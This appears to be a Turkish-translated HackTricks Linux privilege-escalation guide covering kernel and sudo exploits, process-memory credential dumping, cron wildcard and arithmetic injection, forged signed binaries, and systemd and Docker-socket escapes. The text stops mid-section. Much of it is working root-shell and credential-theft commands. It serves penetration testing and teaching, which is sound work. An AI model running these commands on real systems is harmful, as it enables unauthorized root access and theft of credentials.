# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan işletim sistemi hakkında bilgi edinmeye başlayalım
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **`PATH` değişkeninin içindeki herhangi bir klasöre yazma izniniz** varsa bazı libraries veya binaries hijack edebilirsiniz:
```bash
echo $PATH
```
### Env bilgisi

Çevre değişkenlerinde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve escalate privileges için kullanılabilecek exploit olup olmadığını kontrol edin
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
İyi bir vulnerable kernel listesi ve bazı zaten **compiled exploits**'i şurada bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits**'i bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu web'den tüm vulnerable kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Kernel exploitleri aramak için yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (hedef makinede çalıştırın, yalnızca kernel 2.x için exploitleri kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bir kernel exploit'inde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olabilirsiniz.

Ek kernel exploitation tekniği:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen güvenlik açığı bulunan sudo sürümlerine göre:
```bash
searchsploit sudo
```
sudo sürümünün vulnerable olup olmadığını bu grep ile kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo sürümleri 1.9.17p1'den önce (**1.9.14 - 1.9.17 < 1.9.17p1**), kullanıcı kontrolündeki bir dizinden `/etc/nsswitch.conf` dosyası kullanıldığında, yetkisiz yerel kullanıcıların sudo `--chroot` seçeneği aracılığıyla ayrıcalıklarını root'a yükseltmesine izin verir.

O [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) zafiyetini exploit etmek için bir [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) burada. Exploit'i çalıştırmadan önce, `sudo` sürümünüzün ilgili zafiyete sahip olduğunu ve `chroot` özelliğini desteklediğini doğrulayın.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) belgesine bakın.

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg imza doğrulaması başarısız

İnceleyin: **smasher2 box of HTB**'de bu vuln'ün nasıl istismar edilebileceğine dair bir **örnek**.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listele

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Hangi öğelerin **mounted and unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey **unmounted** ise, onu **mount** etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Faydalı yazılımlar

Kullanışlı binaries'leri listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir compiler'ın yüklü olup olmadığını** kontrol edin. Bu, bazı kernel exploit'lerini kullanmanız gerekiyorsa faydalıdır çünkü bunları kullanacağınız makinede (veya benzer bir makinede) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kurulu Güvenlik Açığı Olan Yazılımlar

**Kurulu paketlerin ve servislerin sürümünü** kontrol edin. Belki bazı eski Nagios sürümleri vardır (örneğin) that could be exploited for escalating privileges…\
Daha şüpheli kurulu yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Eğer makineye SSH erişiminiz varsa, makinenin içinde yüklü olan eski veya güvenlik açığı bulunan yazılımları kontrol etmek için **openVAS** de kullanabilirsiniz.

> [!NOTE] > _Bu komutların çoğunlukla işe yaramayan çok fazla bilgi göstereceğini unutmayın; bu nedenle yüklü yazılımların sürümlerinin bilinen exploit'lere karşı savunmasız olup olmadığını kontrol eden OpenVAS veya benzeri uygulamalar önerilir._

## İşlemler

Hangi **işlemlerin** çalıştırıldığını inceleyin ve herhangi bir işlemin olması gerekenden **daha fazla yetkiye** sahip olup olmadığını kontrol edin (örneğin tomcat'in root tarafından çalıştırılması mı?).
```bash
ps aux
ps -ef
top -n 1
```
Her zaman olası [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** bunları işlem komut satırı içindeki `--inspect` parametresini kontrol ederek tespit eder.\
Ayrıca **işlemlerin ikili dosyaları (binaries) üzerindeki ayrıcalıklarınızı kontrol edin**, belki birinin üzerine yazabilirsiniz.

### Süreç izleme

İşlemleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık çalıştırılan veya belirli gereksinimler karşılandığında yürütülen zayıf işlemleri tespit etmek için çok faydalı olabilir.

### Süreç belleği

Bir sunucunun bazı servisleri **kimlik bilgilerini belleğe açık metin olarak kaydedebilir**.\
Normalde diğer kullanıcılara ait işlemlerin belleğini okumak için **root ayrıcalıklarına** ihtiyacınız olur; bu nedenle bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha faydalıdır.\
Ancak unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz işlemlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Günümüzde çoğu makinenin varsayılan olarak **ptrace'e izin vermediğini** unutmayın; bu da yetkisiz kullanıcınıza ait diğer süreçleri dökemezsiniz anlamına gelir.
>
> Dosya _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace'in erişilebilirliğini kontrol eder:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid olduğu sürece tüm süreçler debug edilebilir. Bu, ptracing'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece ebeveyn süreç debug edilebilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir; çünkü CAP_SYS_PTRACE yeteneği gereklidir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptrace'i tekrar etkinleştirmek için yeniden başlatma gerekir.

#### GDB

Eğer bir FTP servisine ait belleğe erişiminiz varsa (örneğin) Heap'i alıp içindeki kimlik bilgilerini arayabilirsiniz.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için, **maps, o işlemin sanal adres alanında belleğin nasıl eşlendiğini gösterir**; ayrıca **her eşlenmiş bölgenin izinlerini** gösterir. Sahte (pseudo) dosya **mem**, **işlemin belleğinin kendisini açığa çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir** olduğunu ve bunların ofsetlerini biliriz. Bu bilgiyi **mem dosyasında seek yapıp tüm okunabilir bölgeleri** bir dosyaya dökmek için kullanırız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. kernel'in sanal adres uzayına `/dev/kmem` kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubunca okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump linux için

ProcDump, Windows için Sysinternals araç paketindeki klasik ProcDump aracının Linux için yeniden tasarlanmış bir versiyonudur. Şuradan edinebilirsiniz: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir işlem belleğini dökmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Root gereksinimlerini manuel olarak kaldırabilir ve size ait işlemi dökebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### İşlem Belleğinden Kimlik Bilgileri

#### Manuel örnek

Eğer authenticator işlemi çalışıyorsa:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilirsiniz (önceki bölümlere bakın; bir process'in memory'sini dump etmenin farklı yollarını bulabilirsiniz) ve memory içinde credentials arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **bellekten düz metin kimlik bilgilerini** ve bazı **iyi bilinen dosyalardan** çalacaktır. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Basic Auth Oturumları)        | apache2              |
| OpenSSH (Aktif SSH Oturumları - Sudo Kullanımı)   | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyorsa ve sadece loopback'e bağlıysa, yine de SSH local port-forwarding ile ona ulaşabilir ve yükseltmek için ayrıcalıklı bir görev oluşturabilirsiniz.

Tipik zincir
- Sadece loopback'e bağlı portu keşfet (ör. 127.0.0.1:8000 gibi) ve Basic-Auth realm'i `ss -ntlp` / `curl -v localhost:8000` ile tespit et
- Kimlik bilgilerini operasyonel artefaktlarda bul:
  - `zip -P <password>` ile şifrelenmiş yedekler/skriptler
  - systemd unit'ında yer alan `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tünel oluşturup giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir iş oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Do not run Crontab UI as root; constrain with a dedicated user and minimal permissions
- Bind to localhost and additionally restrict access via firewall/VPN; do not reuse passwords
- Avoid embedding secrets in unit files; use secret stores or root-only EnvironmentFile
- Enable audit/logging for on-demand job executions



Check if any scheduled job is vulnerable. Maybe you can take advantage of a script being executed by root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

Örneğin, _/etc/crontab_ içinde şu PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kullanıcı "user"ın /home/user üzerinde yazma yetkisine sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı PATH'i ayarlamadan bir komut veya script çalıştırmaya çalışırsa. Örneğin: _\* \* \* \* root overwrite.sh_\
O zaman, şu şekilde root shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, wildcard içeren bir script kullanımı (Wildcard Injection)

Bir script root tarafından çalıştırılıyor ve bir komut içinde “**\***” içeriyorsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için istismar edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Eğer wildcard şu tür bir yolun önünde yer alıyorsa** _**/some/path/\***_ **, bu zafiyetli değildir (hatta** _**./\***_ **de değildir).**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. Eğer root cron/parser güvenilmeyen log alanlarını okuyup bunları aritmetik bir bağlama veriyorsa, bir saldırgan $(...) şeklinde bir command substitution enjekte edebilir; cron çalıştığında bu root olarak çalışır.

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substituted olur (komutu çalıştırarak), sonra kalan sayısal `0` aritmetik için kullanılır; böylece script hata olmadan devam eder.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Komutunuzun stdout'a yazmamasını (veya yönlendirmenizi) sağlayın ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan script **tam erişime sahip olduğunuz bir dizin** kullanıyorsa, o klasörü silip **başka bir klasöre işaret eden bir symlink klasörü oluşturmak** ve sizin kontrolünüzdeki bir script'i sunacak şekilde ayarlamak faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Yazılabilir payload'lara sahip özel imzalı cron binaries
Blue teams bazen cron tarafından tetiklenen binaries'leri, özel bir ELF bölümü döküp vendor string için grep uyguladıktan sonra root olarak çalıştırmadan önce "imzalar". Eğer o binary grup-yazılabilir ise (ör. `/opt/AV/periodic-checks/monitor` sahibi `root:devs 770`) ve signing material'ı leak edebiliyorsanız, bölümü sahteleyip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. Era örneğinde, root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdı, ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` çalıştırdı ve sonra dosyayı yürüttü.
2. leaked key/config (from `signing.zip`) kullanarak beklenen sertifikayı yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir ikame oluşturun (örn., SUID bash bırakın, SSH anahtarınızı ekleyin) ve grep'in geçmesi için sertifikayı `.text_sig` içine gömün:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Yürütme bitlerini koruyarak zamanlanmış binary'nin üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; basit imza kontrolü başarılı olur olmaz payload'ınız root olarak çalışacaktır.

### Sık çalışan cron job'ları

Süreçleri izleyerek her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri arayabilirsiniz. Belki bundan faydalanıp privilege escalation gerçekleştirebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1s'de izle**, **daha az çalıştırılan komutlara göre sırala** ve en çok çalıştırılan komutları silmek için, şu komutu kullanabilirsiniz:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca** [**pspy**](https://github.com/DominicBreuker/pspy/releases) kullanabilirsiniz (bu başlayan her süreci izleyecek ve listeleyecektir).

### Görünmez cron jobs

Yorumdan sonra **carriage return koyarak** (yeni satır karakteri olmadan) bir cronjob oluşturmak mümkündür ve cron job çalışacaktır. Örnek (carriage return karakterine dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyası yazıp yazamadığınızı kontrol edin; yazabiliyorsanız, onu **değiştirebilirsiniz** öyle ki servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuz **çalıştırılsın** (belki makinenin yeniden başlatılmasını beklemeniz gerekir).\
Örneğin .service dosyasının içine **`ExecStart=/tmp/script.sh`** ile backdoor'unuzu oluşturun

### Yazılabilir servis ikili dosyaları

Aklınızda bulundurun ki, **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma izinleriniz** varsa, bunları backdoor'lar için değiştirebilir ve servisler yeniden çalıştırıldığında backdoor'ların çalıştırılmasını sağlayabilirsiniz.

### systemd PATH - Göreceli Yollar

Aşağıdaki komutla **systemd** tarafından kullanılan PATH'i görebilirsiniz:
```bash
systemctl show-environment
```
Yol üzerindeki herhangi bir klasöre **write** yazabildiğinizi fark ederseniz, **escalate privileges** yapabilirsiniz. Servis yapılandırma dosyalarında **relative paths being used on service configurations** olup olmadığını aramanız gerekir:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma hakkınız olan systemd PATH klasörünün içine, göreli yol binary'si ile aynı adı taşıyan bir executable oluşturun ve servisten savunmasız eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde, sizin **backdoor** çalıştırılacaktır (unprivileged users genellikle servisleri başlatamaz/durduramaz ama `sudo -l` kullanıp kullanamadığınızı kontrol edin).

**Hizmetler hakkında daha fazlasını `man systemd.service` ile öğrenin.**

## **Timers**

**Timers**, adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. **Timers**, takvim tabanlı zaman olayları ve monotonik zaman olayları için yerleşik desteğe sahip oldukları ve asenkron olarak çalıştırılabildikleri için cron'a bir alternatif olarak kullanılabilir.

Tüm timer'ları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir zamanlayıcıyı değiştirebilirseniz, systemd.unit içindeki bazı mevcut öğeleri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> Zamanlayıcının süresi dolduğunda etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse, bu değer varsayılan olarak timer unit ile aynı ada sahip olup son ek hariç bir service olur. (Yukarıya bakınız.) Etkinleştirilen unit adı ile timer unit adının, son ek dışında aynı adla isimlendirilmesi önerilir.

Therefore, to abuse this permission you would need to:

- Bir systemd unit (ör. `.service`) bulun; bu unit **yazılabilir bir binary çalıştırıyor**
- Bir systemd unit bulun; bu unit **göreli bir yol çalıştırıyor** ve sizin **systemd PATH** üzerinde **yazma ayrıcalıklarınız** var (bu executable'ı taklit etmek için)

**`man systemd.timer` ile timer'lar hakkında daha fazla bilgi edinin.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **process communication** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **indicate where it is going to listen** to the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **Defaults to false**. For performance reasons, it is recommended to write new daemons only in a way that is suitable for `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Unix Soketlerini Listeleme
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **sockets listening for HTTP** istekleri olabileceğini unutmayın (_.socket dosyalarından değil, unix sockets olarak davranan dosyalardan bahsediyorum_). Bunu şu şekilde kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer socket **responds with an HTTP** request ise, onunla **communicate** edebilir ve belki bazı **exploit some vulnerability**.

### Yazılabilir Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Bu komutlar, host'un dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanıza olanak tanır.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI kullanılamıyorsa, Docker socket yine Docker API ve `curl` komutları kullanılarak manipüle edilebilir.

1.  **List Docker Images:** Kullanılabilir imajların listesini alın.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Host sisteminin root dizinini mount eden bir container oluşturmak için istek gönderin.

```bash
